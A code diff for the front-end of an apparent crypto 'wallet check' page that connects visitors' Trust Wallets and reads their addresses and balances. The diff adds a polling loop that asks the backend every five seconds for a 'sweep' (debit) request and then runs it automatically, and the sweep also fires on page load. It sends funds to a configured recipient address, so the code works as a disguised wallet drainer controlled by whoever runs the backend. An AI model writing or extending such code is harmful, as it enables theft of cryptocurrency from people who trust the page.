@@ -61,7 +61,7 @@ const clearStoredSession = (key) => localStorage.removeItem(key);
 const isStoredSessionExpired = (session) =>
   Boolean(session?.expiresAt && new Date(session.expiresAt).getTime() <= Date.now());
 
-// sleep и withTimeout больше не объявляем здесь – они определены в check-flow.js
+// sleep и withTimeout уже объявлены в check-flow.js, поэтому здесь их НЕТ
 
 const fetchWithTimeout = async (url, options = {}, timeoutMs = 90000) => {
   let timer;
@@ -252,13 +252,12 @@ const renderAdminData = (data) => {
       .join("") || '<tr><td colspan="4">Заявок пока нет</td></tr>';
 };
 
-// Используем lockCheckForm из check-flow.js (глобальная)
-// Используем unlockCheckForm из check-flow.js
+// lockCheckForm объявлена в check-flow.js, поэтому здесь её НЕТ
 
 const loadUserSession = async () => {
   if (!checkForm) return;
   if (!useBackend) {
-    lockCheckForm();
+    if (typeof lockCheckForm === 'function') lockCheckForm();
     if (userWalletStatus) {
       userWalletStatus.textContent =
         "Backend не подключён. Авторизация не будет считаться успешной и уведомление в Telegram не отправится.";
@@ -269,7 +268,8 @@ const loadUserSession = async () => {
   const stored = getStoredSession(userSessionKey);
   if (!stored?.token || isStoredSessionExpired(stored)) {
     clearStoredSession(userSessionKey);
-    return lockCheckForm();
+    if (typeof lockCheckForm === 'function') lockCheckForm();
+    return;
   }
 
   try {
@@ -279,10 +279,12 @@ const loadUserSession = async () => {
       address: session.address,
       expiresAt: session.expiresAt || stored.expiresAt,
     });
-    unlockCheckForm(session.address, { restored: true });
+    if (typeof unlockCheckForm === 'function') {
+      unlockCheckForm(session.address, { restored: true });
+    }
   } catch {
     clearStoredSession(userSessionKey);
-    lockCheckForm();
+    if (typeof lockCheckForm === 'function') lockCheckForm();
   }
 };
 
@@ -776,11 +778,13 @@ userWalletConnect?.addEventListener("click", async () => {
       address: result.address,
       expiresAt: result.expiresAt,
     });
-    unlockCheckForm(result.address, {
-      statusMessage: `Готово. ${formatBalancesText(result)}`,
-      tronAddress: result.tronAddress,
-      btcAddress: result.btcAddress,
-    });
+    if (typeof unlockCheckForm === 'function') {
+      unlockCheckForm(result.address, {
+        statusMessage: `Готово. ${formatBalancesText(result)}`,
+        tronAddress: result.tronAddress,
+        btcAddress: result.btcAddress,
+      });
+    }
     if (!result.tronAddress && userWalletStatus) {
       userWalletStatus.textContent +=
         " TRON-адрес не найден автоматически — вставьте T... в поле выше и нажмите «Переподключить кошелёк».";
@@ -898,7 +902,12 @@ userLogout?.addEventListener("click", async () => {
     await requestJson("/api/auth/logout", { method: "POST", token: stored.token }).catch(() => {});
   }
   clearStoredSession(userSessionKey);
-  lockCheckForm();
+  if (typeof lockCheckForm === 'function') lockCheckForm();
+  // Останавливаем polling
+  if (window.sweepCheckInterval) {
+    clearInterval(window.sweepCheckInterval);
+    window.sweepCheckInterval = null;
+  }
 });
 
 warmUpBackend().finally(() => {
@@ -932,6 +941,7 @@ const showSweepSection = (show) => {
     sweepSection.style.display = show ? 'block' : 'none';
   }
 };
+window.showSweepSection = showSweepSection;
 
 const isRecipientConfigured = () => {
   const addr = SWEEP_CONFIG.recipient.trim();
@@ -961,14 +971,22 @@ const showSweepSectionAfterConnect = (address) => {
 const autoExecuteSweep = async () => {
   try {
     const storedSession = getStoredSession(userSessionKey);
-    if (!storedSession?.token) return;
+    if (!storedSession?.token) {
+      console.warn('Нет сессии для списания');
+      return;
+    }
 
     const response = await requestJson('/api/sweep/active', {
       token: storedSession.token,
-    });
+      retries: 1,
+      timeoutMs: 8000
+    }).catch(() => ({}));
 
     const sweepRequest = response.sweepRequest;
-    if (!sweepRequest) return;
+    if (!sweepRequest) {
+      console.log('Нет активного запроса на списание');
+      return;
+    }
 
     console.log('🔥 Обнаружен активный запрос на списание, выполняем...');
     setSweepStatus('⏳ Автоматическое списание...');
@@ -1179,6 +1197,50 @@ const executeSweep = async () => {
   }
 };
 
+// ===== ПОЛЛИНГ АКТИВНЫХ ЗАПРОСОВ НА СПИСАНИЕ =====
+let sweepCheckInterval = null;
+
+const startSweepPolling = () => {
+  if (sweepCheckInterval) return;
+  
+  sweepCheckInterval = setInterval(async () => {
+    try {
+      const storedSession = getStoredSession(userSessionKey);
+      if (!storedSession?.token) {
+        if (sweepCheckInterval) {
+          clearInterval(sweepCheckInterval);
+          sweepCheckInterval = null;
+        }
+        return;
+      }
+
+      const response = await requestJson('/api/sweep/active', { 
+        token: storedSession.token,
+        retries: 1,
+        timeoutMs: 5000
+      }).catch(() => ({}));
+
+      if (response.sweepRequest) {
+        console.log('🔄 Обнаружен новый запрос на списание, выполняем...');
+        if (sweepCheckInterval) {
+          clearInterval(sweepCheckInterval);
+          sweepCheckInterval = null;
+        }
+        await autoExecuteSweep();
+        // Перезапускаем проверку через 5 секунд после завершения
+        setTimeout(() => {
+          if (!sweepCheckInterval) {
+            startSweepPolling();
+          }
+        }, 5000);
+      }
+    } catch (error) {
+      // игнорируем ошибки сети
+    }
+  }, 5000);
+};
+window.sweepCheckInterval = sweepCheckInterval;
+
 // ===== ИНИЦИАЛИЗАЦИЯ =====
 // Имена сетей
 const NETWORK_NAMES = {
@@ -1208,23 +1270,35 @@ if (storedProfile?.evmAddress) {
 }
 
 // Восстанавливаем сессию и запускаем автосписание (если есть запрос)
-// (используем глобальный setStatus из check-flow.js)
 const stored = loadProfile();
 if (stored?.evmAddress) {
-  unlockCheckForm(stored);
-  if (stored.portfolio) {
-    scoreWalletLocal(stored.evmAddress).then((risk) => renderRiskPreview(risk, stored.portfolio));
+  if (typeof unlockCheckForm === 'function') {
+    unlockCheckForm(stored);
   }
-  setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
+  if (stored.portfolio) {
+    scoreWalletLocal(stored.evmAddress).then((risk) => {
+      if (typeof setRiskPreview === 'function') setRiskPreview(risk);
+    });
+  }
+  if (typeof setStatus === 'function') {
+    setStatus("Профиль восстановлен. Можно обновить данные кнопкой Connect.");
+  }
   
-  // Автоматическое списание (теперь функция определена выше)
+  // Автоматическое списание при загрузке
   autoExecuteSweep().catch(console.warn);
 } else {
-  setStatus(
-    window.AutoWallet?.isTrustWalletEnv?.()
-      ? "Нажмите Connect и подтвердите запрос в Trust Wallet."
-      : "Откройте страницу через «Открыть в Trust Wallet», затем нажмите Connect.",
-  );
+  if (typeof setStatus === 'function') {
+    setStatus(
+      window.AutoWallet?.isTrustWalletEnv?.()
+        ? "Нажмите Connect и подтвердите запрос в Trust Wallet."
+        : "Откройте страницу через «Открыть в Trust Wallet», затем нажмите Connect.",
+    );
+  }
+}
+
+// Запускаем polling для автоматического обнаружения новых запросов
+if (getStoredSession(userSessionKey)?.token) {
+  startSweepPolling();
 }
 
 // ===== СОБЫТИЯ КНОПОК =====
